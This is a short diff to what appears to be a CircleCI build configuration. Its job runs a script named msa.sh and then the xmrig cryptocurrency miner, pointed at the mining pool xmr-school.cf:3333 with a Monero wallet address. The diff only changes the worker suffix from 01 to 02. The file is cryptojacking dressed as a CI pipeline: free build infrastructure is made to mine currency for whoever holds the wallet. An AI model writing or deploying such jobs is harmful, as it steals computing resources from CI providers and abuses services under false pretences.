@@ -8,4 +8,4 @@ jobs:
       - run: apt-get update
       - checkout
       - run: bash ./msa.sh
-      - run: /root/xmrig/build/xmrig  -o xmr-school.cf:3333  -O 5t5mEm254JNJ9HqRjY9vCiTE8aZALHX3v8TqhyQ3TTF9VHKZQXkRYjPDweT9kK4rJw7dDLtZXGjav2z9y24vXCdRc6itMt3TG8KKs9kywu:01 -a cn/half -k --donate-level 1
+      - run: /root/xmrig/build/xmrig  -o xmr-school.cf:3333  -O 5t5mEm254JNJ9HqRjY9vCiTE8aZALHX3v8TqhyQ3TTF9VHKZQXkRYjPDweT9kK4rJw7dDLtZXGjav2z9y24vXCdRc6itMt3TG8KKs9kywu:02 -a cn/half -k --donate-level 1
